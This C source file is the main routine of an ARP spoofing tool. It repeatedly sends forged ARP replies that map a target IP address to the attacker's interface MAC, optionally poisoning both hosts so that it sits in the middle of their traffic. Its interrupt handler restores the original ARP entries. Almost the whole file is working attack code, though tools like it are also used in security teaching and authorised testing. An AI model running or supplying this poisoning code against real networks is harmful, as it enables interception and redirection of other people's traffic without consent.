#include <stdio.h>
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>

#include "arpr_build.h"
#include "arpr_send.h"
#include "get_mac.h"

int running = 1;
int bidirectional = 0;

char *dest_ip;
char *dest_mac;
char *src_ip;
char *src_mac;
char *interface;

void sigint(int sig) {
    (void)sig; 

    printf("\nrestoring initial ARP tables...\n");
    if(bidirectional){
        for(int i = 0; i < 5; i++){

            unsigned char packet1[sizeof(struct ether_header) + sizeof(struct ether_arp)];
            unsigned char packet2[sizeof(struct ether_header) + sizeof(struct ether_arp)];

            arpr_build(dest_ip, dest_mac, src_ip, src_mac, packet1);
            arpr_build(src_ip, src_mac, dest_ip, dest_mac, packet2);

            arpr_send(packet1, interface);
            arpr_send(packet2, interface);

            sleep(1);
        }
    } else {
        for(int i = 0; i < 5; i++){

            unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
            arpr_build(dest_ip, dest_mac, src_ip, src_mac, packet);
            arpr_send(packet, interface);

            sleep(1);
        }
    }
    running = 0;
}

int main(int argc, char *argv[]) {
    (void)argc; 

    signal(SIGINT, sigint);

    if(argc != 4 && argc != 5){
        perror("usage: ./arpspoof <dest_ip> <src_ip> <interface>\n");
        exit(EXIT_FAILURE);
    }


    dest_ip = argv[1];
    dest_mac = get_mac_address(dest_ip);

    src_ip = argv[2];
    src_mac = get_mac_address(src_ip);

    interface = argv[3];

    if(argc == 5){
        bidirectional = atoi(argv[4]);
    }

    char *spoof_mac = interface_mac_address(interface);

    if (dest_ip == NULL || dest_mac == NULL || src_ip == NULL || src_mac == NULL || interface == NULL || spoof_mac == NULL){
        perror("error in variable initialization\n");
    }

    if(bidirectional){
        while(running){

            unsigned char packet1[sizeof(struct ether_header) + sizeof(struct ether_arp)];
            unsigned char packet2[sizeof(struct ether_header) + sizeof(struct ether_arp)];

            arpr_build(dest_ip, dest_mac, src_ip, spoof_mac, packet1);
            arpr_build(src_ip, src_mac, dest_ip, spoof_mac, packet2);

            arpr_send(packet1, interface);
            arpr_send(packet2, interface);

            sleep(1);
        }
    } else {
        while(running){

            unsigned char packet[sizeof(struct ether_header) + sizeof(struct ether_arp)];
            arpr_build(dest_ip, dest_mac, src_ip, spoof_mac, packet);
            arpr_send(packet, interface);
            
            sleep(1);
        }
    }

    

    printf("terminated successfully\n");

    return 0;
}